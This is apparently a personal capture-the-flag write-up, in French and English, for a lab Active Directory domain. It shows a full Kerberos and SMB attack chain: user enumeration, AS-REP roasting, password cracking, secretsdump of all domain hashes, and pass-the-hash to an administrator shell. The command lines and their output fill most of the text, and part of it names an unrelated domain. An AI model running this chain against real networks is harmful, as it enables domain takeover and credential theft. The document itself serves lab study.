## Get Basic Pentest
In this i will use the attacktive Directory to gain some basic stuff                                           
```
└─# ./../../tools/nmapautomate/nmapauto.sh $ip
Nmap scan report for 10.10.26.188
Host is up (1.00s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

ompleted NSE at 15:29, 3.86s elapsed
Nmap scan report for 10.10.26.188
Host is up (7.8s latency).
Not shown: 64514 filtered tcp ports (no-response), 1014 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
53/tcp   open  tcpwrapped
80/tcp   open  tcpwrapped
135/tcp  open  tcpwrapped
139/tcp  open  tcpwrapped
445/tcp  open  tcpwrapped
3268/tcp open  tcpwrapped
3389/tcp open  tcpwrapped

Open Ports : 53,80,135,139,445,3268,3389
└─# nmap -sV -sC -Pn -p53,80,135,139,445,88,389,3268,3389 10.10.26.188
NSE Timing: About 98.61% done; ETC: 15:38 (0:00:04 remaining)
Nmap scan report for 10.10.26.188
Host is up (0.82s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-20 21:32:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-02-20T21:33:24
|_  start_date: N/A
|_clock-skew: -3s
```
The domaim `spookysec.local` and the Domain Controller `ATTACKTIVEDIREC.spookysec.local`
Tu peux utiliser `enum4linux` pour enumerer le port 139/445 SMB

## Finding users or share
```
└─# crackmapexec smb $ip -u '' -p ''
SMB         10.10.26.188    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  [+] spookysec.local\:

```
Nous utiliserons le `--rid-brute 10000` si le `anonymous login` est autorisee
``` 
┌──(root㉿xXxX)-[/home/blo/Github/RED-TEAM]
└─# crackmapexec smb $ip -u '' -p '' --rid-brute 10000
SMB         10.10.26.188    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  [+] spookysec.local\:
SMB         10.10.26.188    445    ATTACKTIVEDIREC  [+] Brute forcing RIDs
SMB         10.10.26.188    445    ATTACKTIVEDIREC  498: THM-AD\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1000: THM-AD\ATTACKTIVEDIREC$ (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1101: THM-AD\DnsAdmins (SidTypeAlias)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1102: THM-AD\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1103: THM-AD\skidy (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1104: THM-AD\breakerofthings (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1105: THM-AD\james (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1106: THM-AD\optional (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1107: THM-AD\sherlocksec (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1108: THM-AD\darkstar (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1109: THM-AD\Ori (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1110: THM-AD\robin (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1111: THM-AD\paradox (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1112: THM-AD\Muirland (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1113: THM-AD\horshark (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1114: THM-AD\svc-admin (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1116: THM-AD\CompStaff (SidTypeAlias)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1117: THM-AD\dc (SidTypeGroup)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1118: THM-AD\backup (SidTypeUser)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  1601: THM-AD\a-spooks (SidTypeUser)
```
Maintenant que j'ai des users, je vais utiliser le kerberoas pour voir si elles sont valides.
```
└─# kerbrute userenum --dc 10.10.26.188 -d spookysec.local users.txt
└─# kerbrute userenum --dc 10.10.26.188 -d spookysec.local users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 02/20/24 - Ronnie Flathers @ropnop

2024/02/20 15:57:29 >  Using KDC(s):
2024/02/20 15:57:29 >  	10.10.26.188:88

2024/02/20 15:57:30 >  [+] VALID USERNAME:	 optional@spookysec.local
2024/02/20 15:57:30 >  [+] VALID USERNAME:	 breakerofthings@spookysec.local
2024/02/20 15:57:30 >  [+] VALID USERNAME:	 ATTACKTIVEDIREC$@spookysec.local
2024/02/20 15:57:31 >  [+] VALID USERNAME:	 sherlocksec@spookysec.local
2024/02/20 15:57:31 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2024/02/20 15:57:31 >  [+] VALID USERNAME:	 paradox@spookysec.local
2024/02/20 15:57:31 >  [+] VALID USERNAME:	 horshark@spookysec.local
2024/02/20 15:57:31 >  [+] VALID USERNAME:	 a-spooks@spookysec.local
2024/02/20 15:57:31 >  [+] VALID USERNAME:	 Muirland@spookysec.local
2024/02/20 15:57:31 >  [+] VALID USERNAME:	 backup@spookysec.local
2024/02/20 15:57:31 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2024/02/20 15:57:31 >  Done! Tested 17 usernames (11 valid) in 2.159 seconds

```
Dans les 17 on a que 11 qui sont valides dans kerberos. So maintenant je vais utiliser les users la pour l'attaque de `AS-REP Roast` avec le `GetUserSPNs.py`
## AS-REP Roast attack
Ce type d'attaque recherche des utilisateurs sans qu'une pré-authentification Kerberos soit nécessaire. Cela signifie que vous pouvez envoyer un `AS_REQ` à ruycr4ft.local avec une liste d'utilisateurs, et recevoir un message AS_REP. Ce message contient un hachage du mot de passe de l'utilisateur. Avec ce mot de passe, nous pouvons essayer de le craquer hors ligne.
```
❯ impacket-GetNPUsers ruycr4ft.local/ -no-pass -usersfile users

[-] User ATTACKTIVEDIREC$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User skidy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User breakerofthings doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User optional doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sherlocksec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ori doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Muirland doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User horshark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:01c470a168bb5808c68d140bcb2a9c3b$ba051a5740a8c329ba2c1e41886752b3ef962e2586ff3094098140b84d775e8dbc0565c7bdaf3813086f98004e287a5bc0828219f6a9b4da53e365189746dd70a4ea1c7dd275c71618104214888e36ca7cd735b1cb55eb72b1c1031f8bfe36adbb485dbc8c713d4a4d8dd75305e824c8f95a6798ebb362853a319428f57659f51143ffdfce8d0280765e6ba656dcf1c587098ed78ba473188ca9e685339abd545d03e32a9d34a19eba807387634a281bd99571229d82783bd721b09268d9cbe7f67f9d4adb2ef2f1f1aac3936008e0d9f6a7f1c4edb1f20cf173fd6f3fb52032c0bda4518e24caf2ba150bf79bd4c1c4c3c9
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Now crackons ce hash avec hashcat
```
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
1g 0:00:00:02 DONE (2024-02-20 16:19) 0.3344g/s 1952Kp/s 1952Kc/s 1952KC/s manaia08..mamuci
Use the "--show" option to display all of the cracked passwords reliably
Session completed.


└─# hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

```

## Enumerer les SHares
```
┌──(root㉿xXxX)-[/home/blo/CTFs/Boot2root/TryHackMe]
└─# crackmapexec smb 10.10.26.188 -u svc-admin -p 'management2005' --shares
SMB         10.10.26.188    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
```
Utiliser `impacket-smbclient` au lieu de `smbclient`	
```
└─# impacket-smbclient spookysec.local/svc-admin:management2005@10.10.26.188
# help

 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 lls {dirname} - lists all the files on the local filesystem.
 tree {filepath} - recursively lists all files in folder and sub folders
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)
# shares
ADMIN$
backup
C$
IPC$
NETLOGON
SYSVOL

# use SYSVOL
# ls
drw-rw-rw-          0  Sat Apr  4 13:39:35 2020 .
drw-rw-rw-          0  Sat Apr  4 13:39:35 2020 ..
drw-rw-rw-          0  Sat Apr  4 13:39:35 2020 spookysec.local
# recurse on
*** Unknown syntax: recurse on
# mget *
# cd ..
# use backup
# ls
drw-rw-rw-          0  Sat Apr  4 14:08:39 2020 .
drw-rw-rw-          0  Sat Apr  4 14:08:39 2020 ..
-rw-rw-rw-         48  Sat Apr  4 14:08:53 2020 backup_credentials.txt
# get *
[-] SMB SessionError: code: 0xc0000033 - STATUS_OBJECT_NAME_INVALID - The object name is invalid.
# get backup_credentials.txt
# exit
└─# cat backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860 
```

```
└─# crackmapexec smb 10.10.26.188 -u backup -p 'backup2517860' --shares
└─# crackmapexec smb 10.10.26.188 -u backup -p 'backup2517860' --shares
SMB         10.10.26.188    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.26.188    445    ATTACKTIVEDIREC  [+] spookysec.local\backup:backup2517860
SMB         10.10.26.188    445    ATTACKTIVEDIREC  [+] Enumerated shares
SMB         10.10.26.188    445    ATTACKTIVEDIREC  Share           Permissions     Remark
SMB         10.10.26.188    445    ATTACKTIVEDIREC  -----           -----------     ------
SMB         10.10.26.188    445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin
SMB         10.10.26.188    445    ATTACKTIVEDIREC  backup
SMB         10.10.26.188    445    ATTACKTIVEDIREC  C$                              Default share
SMB         10.10.26.188    445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
SMB         10.10.26.188    445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share
SMB         10.10.26.188    445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share

```

Avec ce user je vais essayer d'utiliser `secretsdump` avec impacket pour extraire des secrets et hash
```
└─# impacket-secretsdump spookysec.local/backup:backup2517860@10.10.26.188
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:d0193d9c6cfd97eb6f0ffc78cf6990e0:::

```
Avec le privilege backup j'ai pu dump le fichier `ntds` qui contient les hash NT de tous les users

## Pass-the-Hash
Avec ces hash je vais voir si le port `5985` est ouvert puis me connecter avec `evil-winrm`
```
└─# nc -nv 10.10.26.188 5985
(UNKNOWN) [10.10.26.188] 5985 (?) open
```
**evil-winrm**
```
└─# evil-winrm -i 10.10.26.188 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
```
**wmiexec**
```
└─# impacket-wmiexec spookysec.local/administrator@10.10.26.188 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
thm-ad\administrator
```